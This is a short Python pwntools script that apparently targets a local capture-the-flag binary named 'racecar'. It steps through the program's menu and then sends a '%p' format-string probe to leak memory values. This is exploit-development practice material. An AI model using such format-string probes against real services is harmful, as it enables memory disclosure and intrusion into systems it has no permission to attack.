from pwn import *

p = process("./racecar")

def go_to_end():
    p.sendline("Name")
    p.recv()
    p.sendline("Nickname")
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline("2")
    p.recv()

go_to_end()
p.sendline("%p")
